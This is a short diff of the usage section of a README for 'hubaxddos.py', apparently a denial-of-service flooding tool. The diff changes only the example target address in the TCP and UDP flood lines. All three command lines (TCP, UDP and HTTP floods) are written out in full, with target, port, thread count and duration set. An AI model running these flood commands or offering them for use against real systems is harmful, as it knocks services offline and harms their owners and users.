@@ -27,10 +27,10 @@ python3 hubaxddos.py -i
 ### Command Line:
 ```bash
 # TCP Flood
-python3 hubaxddos.py -t 192.168.1.1 -p 80 -m tcp -th 500 -d 60
+python3 hubaxddos.py -t 000.000.0.0 -p 80 -m tcp -th 500 -d 60
 
 # UDP Flood
-python3 hubaxddos.py -t 192.168.1.1 -p 53 -m udp -th 1000 -d 120
+python3 hubaxddos.py -t 000.000.0.0 -p 53 -m udp -th 1000 -d 120
 
 # HTTP Flood
 python3 hubaxddos.py -t https://target.com -m http -th 300 -d 180
